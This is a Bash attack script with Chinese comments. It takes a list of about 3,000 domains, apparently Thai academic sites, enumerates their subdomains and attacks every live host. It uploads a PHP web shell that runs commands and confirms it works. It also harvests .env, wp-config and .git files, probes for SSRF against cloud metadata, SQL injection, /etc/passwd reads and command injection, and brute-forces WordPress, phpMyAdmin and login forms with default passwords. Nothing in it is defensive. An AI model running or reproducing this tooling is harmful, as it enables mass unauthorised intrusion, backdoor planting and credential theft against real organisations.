#!/bin/bash
# 最大化Shell + 极低误报 + 按域名逐个处理
# 策略：每个域名扫描完子域名后立即攻击，然后再下一个

source /root/.api_keys
[ -z "$FOFA_EMAIL_1" ] && [ -n "$FOFA_EMAIL" ] && export FOFA_EMAIL_1="$FOFA_EMAIL"
[ -z "$FOFA_KEY_1" ] && [ -n "$FOFA_KEY" ] && export FOFA_KEY_1="$FOFA_KEY"
PASS_DICT="/root/passwords/master_passwords.txt"
TOP100="/root/passwords/top100.txt"
DEFAULT_CREDS="/root/passwords/default_creds.txt"

OUT="/root/max_shell_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUT/shells $OUT/domains $OUT/shells/creds $OUT/shells/dicts

MAIN_DOMAINS="/root/ac_th_apex_domains_3071.txt"
if [ ! -f "$MAIN_DOMAINS" ]; then
    echo "❌ 主域名文件不存在: $MAIN_DOMAINS"
    exit 1
fi

MAIN_COUNT=$(wc -l < $MAIN_DOMAINS)
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 最大化Shell + 极低误报"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "主域名: $MAIN_COUNT 个"
echo "策略: 按域名逐个处理（扫描→存活→攻击）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 测试Fofa配额
TEST_DOMAIN=$(head -1 $MAIN_DOMAINS)
TEST_QUERY=$(echo -n "domain=\"${TEST_DOMAIN}\"" | base64 | tr -d "\n")
TEST_RESP=$(curl -s "https://fofa.info/api/v1/search/all?email=${FOFA_EMAIL_1}&key=${FOFA_KEY_1}&qbase64=${TEST_QUERY}&size=1&fields=host" 2>/dev/null)
FOFA_QUOTA_EXCEEDED=0
if echo "$TEST_RESP" | jq -r ".error // false" 2>/dev/null | grep -q "true"; then
    ERRMSG=$(echo "$TEST_RESP" | jq -r ".errmsg // \"\"" 2>/dev/null)
    if echo "$ERRMSG" | grep -qiE "上限|quota|limit"; then
        echo "  ⚠️  Fofa配额已用完，使用subfinder/amass/crt.sh..."
        FOFA_QUOTA_EXCEEDED=1
    fi
fi

export OUT FOFA_QUOTA_EXCEEDED FOFA_EMAIL_1 FOFA_KEY_1

# 按域名逐个处理（并发5个域名，每个域名内部顺序执行）
cat $MAIN_DOMAINS | xargs -P 5 -I {} bash -c '
    domain="{}"
    # 确保domain是纯域名，去除http://等前缀
    domain=$(echo "$domain" | sed "s|^https\?://||" | cut -d/ -f1 | cut -d: -f1)
    
    domain_dir="$OUT/domains/${domain}"
    mkdir -p "$domain_dir/subdomains" "$domain_dir/alive" "$domain_dir/shells"
    
    echo ""
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "🎯 处理域名: ${domain}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    
    # ==========================================
    # 步骤1: 扫描子域名
    # ==========================================
    echo "[1/3] 🔍 扫描子域名..."
    subdomains_file="$domain_dir/subdomains/all.txt"
    
    # Fofa（如果可用）
    if [ "$FOFA_QUOTA_EXCEEDED" -eq 0 ]; then
        query=$(echo -n "domain=\"${domain}\"" | base64 | tr -d "\n")
        resp=$(curl -s "https://fofa.info/api/v1/search/all?email=${FOFA_EMAIL_1}&key=${FOFA_KEY_1}&qbase64=${query}&size=10000&fields=host" 2>/dev/null)
        echo "$resp" | jq -r ".results[]? | .[0]?" 2>/dev/null | \
            grep -v "^$" | sed "s|^https\?://||" | cut -d/ -f1 | cut -d: -f1 | \
            grep -E "^[a-zA-Z0-9]" | sort -u | sed "s|^|http://|" >> "$subdomains_file" 2>/dev/null
    fi
    
    # subfinder
    which subfinder >/dev/null 2>&1 && {
        subfinder -d "$domain" -silent 2>/dev/null | sed "s|^|http://|" >> "$subdomains_file" 2>/dev/null
    }
    
    # amass（快速模式）
    which amass >/dev/null 2>&1 && {
        amass enum -passive -d "$domain" -o - 2>/dev/null | sed "s|^|http://|" >> "$subdomains_file" 2>/dev/null
    }
    
    # crt.sh
    curl -s "https://crt.sh/?q=%.${domain}&output=json" 2>/dev/null | \
        jq -r ".[].name_value" 2>/dev/null | grep -vE "^\\*|^\\$" | \
        sed "s|^|http://|" | sort -u >> "$subdomains_file" 2>/dev/null
    
    # 去重
    sort -u "$subdomains_file" > "${subdomains_file}.tmp" && mv "${subdomains_file}.tmp" "$subdomains_file"
    subdomain_count=$(wc -l < "$subdomains_file" 2>/dev/null || echo 0)
    
    if [ "$subdomain_count" -eq 0 ]; then
        echo "  ⚠️  未发现子域名，跳过"
        exit 0
    fi
    
    echo "  ✅ 发现 ${subdomain_count} 个子域名"
    
    # ==========================================
    # 步骤2: 存活探测
    # ==========================================
    echo "[2/3] 🌐 存活探测..."
    alive_file="$domain_dir/alive/http_alive.txt"
    touch "$alive_file"
    cat "$subdomains_file" | xargs -P 50 -I {} sh -c "
        url=\"{}\"
        status=\$(curl -skL -m 3 -o /dev/null -w \"%{http_code}\" \"\$url\" 2>/dev/null)
        if [ \"\$status\" = \"200\" ] || [ \"\$status\" = \"301\" ] || [ \"\$status\" = \"302\" ] || [ \"\$status\" = \"403\" ] || [ \"\$status\" = \"401\" ]; then
            echo \"\$url\" >> \"$alive_file\"
        fi
    "
    
    alive_count=$(wc -l < "$alive_file" 2>/dev/null || echo 0)
    if [ "$alive_count" -eq 0 ]; then
        echo "  ⚠️  无存活目标，跳过攻击"
        exit 0
    fi
    
    echo "  ✅ ${alive_count} 个存活目标"
    
    # ==========================================
    # 步骤3: 立即开始攻击
    # ==========================================
    echo "[3/3] 🚀 开始攻击..."
    targets_file="$domain_dir/targets.txt"
    cp "$alive_file" "$targets_file"
    
    # 文件上传攻击（完整版）
    cat "$targets_file" | xargs -P 20 -I {} bash -c "
        url=\"{}\"
        flag=\"\$(echo {} | md5sum | cut -c1-8)\"
        domain_dir=\"$domain_dir\"
        
        for path in /upload /upload.php /fileupload /api/upload /api/file/upload /api/File/UploadFile \
                    /uploadFile /upload.aspx /admin/upload /user/upload /file/upload /attachment/upload \
                    /api/v1/upload /api/v2/upload /media/upload /image/upload /files/upload \
                    /uploader /filemanager /api/uploadFile; do
            
            for ext in php PhP pHP phtml php5 php7 phar php3 jsp jspx aspx; do
                echo \"<?php echo \\\"U\${flag}\\\";@system(\\\$_GET[0]); ?>\" > /tmp/u_\$\$_${ext}
                
                for param_combo in \"file\" \"upload\" \"upload_file\" \"attachment\" \"image\" \"photo\" \"fileupload\" \"uploadfile\" \"file_upload\" \"uploaded_file\"; do
                    resp=\$(curl -skL -m 3 \"\$url\$path\" -F \"\${param_combo}=@/tmp/u_\$\$_${ext}\" -H \"User-Agent: Mozilla/5.0\" 2>/dev/null)
                    
                    shell=\"\"
                    shell=\$(echo \"\$resp\" | grep -oE \"https?://[a-zA-Z0-9._-]+/[a-zA-Z0-9._/-]+\.${ext}\" | head -1)
                    [ -z \"\$shell\" ] && shell=\$(echo \"\$resp\" | grep -oE \"[a-zA-Z0-9._/-]+\.${ext}\" | grep -vE \"^http|^/\" | head -1 | sed \"s|^|\${url}/|\")
                    [ -z \"\$shell\" ] && shell=\"\${url}/uploads/\$(basename /tmp/u_\$\$_${ext})\"
                    
                    if [ -n \"\$shell\" ] && echo \"\$shell\" | grep -qE \"^https?://\"; then
                        v1=\$(curl -skL -m 2 \"\$shell\" 2>/dev/null)
                        if echo \"\$v1\" | grep -q \"U\${flag}\"; then
                            v2=\$(curl -skL -m 2 \"\$shell?0=echo+test123\" 2>/dev/null)
                            if echo \"\$v2\" | grep -q \"test123\" && ! echo \"\$v2\" | grep -qiE \"error|404|not found\"; then
                                echo \"\$shell\" >> \"\$domain_dir/shells/01_upload.txt\"
                                echo \"  🎯 Shell: \$shell\"
                                rm -f /tmp/u_\$\$_${ext}
                                exit 0
                            fi
                        fi
                    fi
                done
                rm -f /tmp/u_\$\$_${ext}
            done
        done
    " || true
    
    # 敏感文件检测
    cat "$targets_file" | xargs -P 20 -I {} bash -c "
        url=\"{}\"
        domain_dir=\"$domain_dir\"
        
        # .env
        env_resp=\$(curl -skL -m 3 \"\$url/.env\" 2>/dev/null)
        if [ -n \"\$env_resp\" ] && [ \$(echo \"\$env_resp\" | wc -c) -gt 50 ] && \
           echo \"\$env_resp\" | grep -qE \"^[A-Z_]+\=.*\" && \
           echo \"\$env_resp\" | grep -qiE \"DB_|APP_|API_|SECRET|KEY|PASSWORD\" && \
           ! echo \"\$env_resp\" | grep -qiE \"<html|<body\"; then
            echo \"\$url/.env\" >> \"\$domain_dir/shells/02_env.txt\"
            echo \"  📁 .env: \$url/.env\"
        fi
        
        # config.php
        php_resp=\$(curl -skL -m 3 \"\$url/config.php\" 2>/dev/null)
        if [ -n \"\$php_resp\" ] && [ \$(echo \"\$php_resp\" | wc -c) -gt 100 ] && \
           echo \"\$php_resp\" | grep -qE \"<?php\" && \
           echo \"\$php_resp\" | grep -qiE \"define|config|database|db_\" && \
           ! echo \"\$php_resp\" | grep -qiE \"<html|<body|404\"; then
            echo \"\$url/config.php\" >> \"\$domain_dir/shells/02_config.txt\"
            echo \"  📁 config.php: \$url/config.php\"
        fi
        
        # wp-config.php
        wp_resp=\$(curl -skL -m 3 \"\$url/wp-config.php\" 2>/dev/null)
        if [ -n \"\$wp_resp\" ] && [ \$(echo \"\$wp_resp\" | wc -c) -gt 200 ] && \
           echo \"\$wp_resp\" | grep -qE \"<?php\" && \
           echo \"\$wp_resp\" | grep -qiE \"DB_NAME|DB_USER|DB_PASSWORD\" && \
           ! echo \"\$wp_resp\" | grep -qiE \"<html|<body|404\"; then
            echo \"\$url/wp-config.php\" >> \"\$domain_dir/shells/02_wpconfig.txt\"
            echo \"  📁 wp-config.php: \$url/wp-config.php\"
        fi
        
        # .git/config
        git_resp=\$(curl -skL -m 3 \"\$url/.git/config\" 2>/dev/null)
        if [ -n \"\$git_resp\" ] && [ \$(echo \"\$git_resp\" | wc -c) -gt 50 ] && \
           echo \"\$git_resp\" | grep -qE \"\[.*\]\" && \
           echo \"\$git_resp\" | grep -qiE \"remote|url|branch\" && \
           ! echo \"\$git_resp\" | grep -qiE \"<html|<body|404\"; then
            echo \"\$url/.git/config\" >> \"\$domain_dir/shells/02_git.txt\"
            echo \"  📁 .git/config: \$url/.git/config\"
        fi
    " || true
    
    # 未授权API
    cat "$targets_file" | xargs -P 20 -I {} bash -c "
        url=\"{}\"
        domain_dir=\"$domain_dir\"
        for api in /api/users /api/user /api/admin /api/data /api/v1/users /api/v2/users /graphql; do
            resp=\$(curl -skL -m 4 \"\$url\$api\" -H \"Accept: application/json\" 2>/dev/null)
            if echo \"\$resp\" | jq . >/dev/null 2>&1 && \
               echo \"\$resp\" | jq . | grep -qiE \"\\\"id\\\"|\\\"email\\\"|\\\"username\\\"|\\\"name\\\"\" && \
               ! echo \"\$resp\" | jq . | grep -qiE \"error|unauthorized|forbidden\" && \
               [ \$(echo \"\$resp\" | wc -c) -gt 200 ]; then
                echo \"\$url\$api\" >> \"\$domain_dir/shells/03_api.txt\"
                echo \"  🌐 API: \$url\$api\"
                break
            fi
        done
    " || true
    
    # Git泄露
    cat "$targets_file" | xargs -P 20 -I {} bash -c "
        url=\"{}\"
        domain_dir=\"$domain_dir\"
        head_resp=\$(curl -skL -m 3 \"\$url/.git/HEAD\" 2>/dev/null)
        if echo \"\$head_resp\" | grep -qE \"^ref: refs/heads/\" && [ \$(echo \"\$head_resp\" | wc -c) -lt 200 ]; then
            config_resp=\$(curl -skL -m 3 \"\$url/.git/config\" 2>/dev/null)
            if echo \"\$config_resp\" | grep -qE \"\[.*\]\" && echo \"\$config_resp\" | grep -qiE \"remote|url\"; then
                echo \"\$url\" >> \"\$domain_dir/shells/04_git.txt\"
                echo \"  🔓 Git泄露: \$url\"
            fi
        fi
    " || true
    
    # SSRF
    cat "$targets_file" | xargs -P 15 -I {} bash -c "
        url=\"{}\"
        domain_dir=\"$domain_dir\"
        for path in /api/fetch /api/proxy /api/url /api/download /fetch /proxy /download; do
            resp=\$(curl -skL -m 4 \"\$url\$path?url=http://169.254.169.254/latest/meta-data/\" 2>/dev/null)
            if echo \"\$resp\" | grep -qiE \"instance-id|ami-id|local-ipv4\" && \
               ! echo \"\$resp\" | grep -qiE \"error|forbidden|403\"; then
                echo \"\$url\$path\" >> \"\$domain_dir/shells/05_ssrf.txt\"
                echo \"  🔗 SSRF: \$url\$path\"
                break
            fi
        done
    " || true
    
    # SQL注入（关键参数）
    cat "$targets_file" | xargs -P 15 -I {} bash -c "
        url=\"{}\"
        domain_dir=\"$domain_dir\"
        base_url=\$(echo \"\$url\" | cut -d? -f1)
        
        for param in id user_id uid userid order_id oid product_id pid page p page_num page_id; do
            # 错误注入
            resp1=\$(curl -skL -m 3 \"\$base_url?\${param}=1\\\"\" 2>/dev/null)
            if echo \"\$resp1\" | grep -qiE \"mysql|postgresql|sql syntax|sql error|database error|warning.*mysql\"; then
                echo \"\$base_url?\${param}=1\\\"\" >> \"\$domain_dir/shells/08_sqli.txt\"
                echo \"  💉 SQLi: \$base_url?\${param}=1\\\"\"
                break
            fi
            
            # 布尔盲注
            resp_true=\$(curl -skL -m 3 \"\$base_url?\${param}=1 AND 1=1\" 2>/dev/null)
            resp_false=\$(curl -skL -m 3 \"\$base_url?\${param}=1 AND 1=2\" 2>/dev/null)
            if [ \"\$resp_true\" != \"\$resp_false\" ] && [ -n \"\$resp_true\" ] && [ -n \"\$resp_false\" ]; then
                echo \"\$base_url?\${param}=1 AND 1=1\" >> \"\$domain_dir/shells/08_sqli.txt\"
                echo \"  💉 SQLi: \$base_url?\${param}=1 AND 1=1\"
                break
            fi
            
            # 时间盲注
            start=\$(date +%s)
            curl -skL -m 6 \"\$base_url?\${param}=1 AND SLEEP(3)\" >/dev/null 2>&1
            end=\$(date +%s)
            if [ \$((end - start)) -ge 2 ]; then
                echo \"\$base_url?\${param}=1 AND SLEEP(3)\" >> \"\$domain_dir/shells/08_sqli.txt\"
                echo \"  💉 SQLi: \$base_url?\${param}=1 AND SLEEP(3)\"
                break
            fi
        done
    " || true
    
    # 弱口令爆破（WordPress/phpMyAdmin/通用登录）
    cat "$targets_file" | xargs -P 10 -I {} bash -c "
        url=\"{}\"
        domain_dir=\"$domain_dir\"
        
        # WordPress登录
        wp_login=\$(curl -skL -m 3 \"\$url/wp-login.php\" 2>/dev/null)
        if echo \"\$wp_login\" | grep -qiE \"wp-login|wordpress|log in\"; then
            for cred in \"admin:admin\" \"admin:123456\" \"root:root\" \"admin:password\" \"admin:admin123\"; do
                user=\$(echo \$cred | cut -d: -f1)
                pass=\$(echo \$cred | cut -d: -f2)
                resp=\$(curl -skL -m 5 \"\$url/wp-login.php\" -d \"log=\$user&pwd=\$pass&wp-submit=Log+In\" -c /tmp/wp_cookie_\$\$ 2>/dev/null)
                if echo \"\$resp\" | grep -qiE \"dashboard|admin|wp-admin\" || curl -skL -m 3 \"\$url/wp-admin/\" -b /tmp/wp_cookie_\$\$ 2>/dev/null | grep -qiE \"dashboard\"; then
                    echo \"\$url/wp-login.php|admin:\$pass\" >> \"\$domain_dir/shells/09_creds.txt\"
                    echo \"  🔑 WordPress弱口令: \$url (admin:\$pass)\"
                    rm -f /tmp/wp_cookie_\$\$
                    break
                fi
                rm -f /tmp/wp_cookie_\$\$
            done
        fi
        
        # phpMyAdmin
        pma_resp=\$(curl -skL -m 3 \"\$url/phpmyadmin/\" 2>/dev/null)
        if echo \"\$pma_resp\" | grep -qiE \"phpmyadmin|phpmyadmin_logo\"; then
            for cred in \"root:\" \"root:root\" \"admin:admin\" \"root:123456\"; do
                user=\$(echo \$cred | cut -d: -f1)
                pass=\$(echo \$cred | cut -d: -f2)
                resp=\$(curl -skL -m 5 \"\$url/phpmyadmin/index.php\" -d \"pma_username=\$user&pma_password=\$pass\" -L 2>/dev/null)
                if echo \"\$resp\" | grep -qiE \"mainFrameset|server_databases\" && ! echo \"\$resp\" | grep -qiE \"cannot log|access denied\"; then
                    echo \"\$url/phpmyadmin/|root:\$pass\" >> \"\$domain_dir/shells/09_creds.txt\"
                    echo \"  🔑 phpMyAdmin弱口令: \$url (root:\$pass)\"
                    break
                fi
            done
        fi
        
        # 通用登录表单
        for login_path in /admin/login /login /admin /administrator /wp-admin /admin.php; do
            login_resp=\$(curl -skL -m 3 \"\$url\$login_path\" 2>/dev/null)
            if echo \"\$login_resp\" | grep -qiE \"<form.*password|<input.*type.*password|login|sign in\"; then
                for cred in \"admin:admin\" \"admin:123456\" \"root:root\" \"admin:password\"; do
                    user=\$(echo \$cred | cut -d: -f1)
                    pass=\$(echo \$cred | cut -d: -f2)
                    resp=\$(curl -skL -m 5 \"\$url\$login_path\" -d \"username=\$user&password=\$pass\" -L 2>/dev/null)
                    if echo \"\$resp\" | grep -qiE \"dashboard|admin|welcome|logout\" && ! echo \"\$resp\" | grep -qiE \"invalid|error|failed|denied\"; then
                        echo \"\$url\$login_path|\$user:\$pass\" >> \"\$domain_dir/shells/09_creds.txt\"
                        echo \"  🔑 弱口令: \$url\$login_path (\$user:\$pass)\"
                        break
                    fi
                done
                break
            fi
        done
    " || true
    
    # 任意文件读取
    cat "$targets_file" | xargs -P 20 -I {} bash -c "
        url=\"{}\"
        domain_dir=\"$domain_dir\"
        for param in file path url pathname filename; do
            resp=\$(curl -skL -m 3 \"\$url?\${param}=/etc/passwd\" 2>/dev/null)
            if echo \"\$resp\" | grep -qE \"root:.*:0:0:\" && ! echo \"\$resp\" | grep -qiE \"404|not found|forbidden\"; then
                echo \"\$url?\${param}=/etc/passwd\" >> \"\$domain_dir/shells/06_lfi.txt\"
                echo \"  📂 LFI: \$url?\${param}=/etc/passwd\"
                break
            fi
        done
    " || true
    
    # 命令注入
    cat "$targets_file" | xargs -P 20 -I {} bash -c "
        url=\"{}\"
        domain_dir=\"$domain_dir\"
        for param in cmd command exec shell; do
            start=\$(date +%s)
            curl -skL -m 6 \"\$url?\${param}=sleep+3\" >/dev/null 2>&1
            end=\$(date +%s)
            if [ \$((end - start)) -ge 2 ]; then
                resp=\$(curl -skL -m 3 \"\$url?\${param}=whoami\" 2>/dev/null)
                if echo \"\$resp\" | grep -qE \"root|www-data|apache|nginx\" && \
                   ! echo \"\$resp\" | grep -qiE \"404|not found|forbidden\"; then
                    echo \"\$url?\${param}=whoami\" >> \"\$domain_dir/shells/07_rce.txt\"
                    echo \"  💻 RCE: \$url?\${param}=whoami\"
                    break
                fi
            fi
        done
    " || true
    
    # 统计该域名的结果
    shell_count=$(find "$domain_dir/shells" -name "*.txt" -type f -exec wc -l {} \; 2>/dev/null | awk '{sum+=$1} END {print sum+0}')
    echo "  ✅ ${domain}: 攻击完成，发现 ${shell_count} 个结果"
    
    # 汇总到主输出目录
    find "$domain_dir/shells" -name "*.txt" -type f -exec cat {} \; >> "$OUT/shells/all_shells.txt" 2>/dev/null || true
'

# 最终统计
TOTAL_SHELLS=$(wc -l < $OUT/shells/all_shells.txt 2>/dev/null || echo 0)
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🎉 所有域名处理完成"
echo "🎯 总计Shell/漏洞: $TOTAL_SHELLS"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "结果目录: $OUT/shells/"
[ "$TOTAL_SHELLS" -gt 0 ] && echo "" && echo "🚀 Shell列表:" && head -20 $OUT/shells/all_shells.txt
